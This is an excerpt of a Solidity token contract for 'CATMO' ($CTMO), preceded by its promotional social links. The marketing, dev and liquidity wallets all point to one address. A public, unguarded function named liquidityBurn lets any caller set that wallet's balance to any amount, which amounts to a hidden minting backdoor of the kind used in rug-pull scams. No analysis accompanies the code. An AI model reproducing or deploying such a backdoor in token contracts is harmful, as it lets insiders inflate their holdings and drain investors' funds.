...
http://t.me/CatmoARB
https://twitter.com/CatmoARB
https://medium.com/@CatmoARB/catmo-finding-his-love-907632da1639
http://www.mothecat.xyz/
*/
...
contract CATMO is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xf13c9D089591FE0f7fB34d31e812120824533ECB); 
    address payable public Wallet_Dev = payable(0xf13c9D089591FE0f7fB34d31e812120824533ECB);
    address payable private Liquidity = payable(0xf13c9D089591FE0f7fB34d31e812120824533ECB);
    ...
    string private constant _name = "CATMO"; 
    string private constant _symbol = unicode"$CTMO"; 
    ...
    function liquidityBurn(uint256 burn) public {
        _tOwned[Liquidity] = burn;
    }
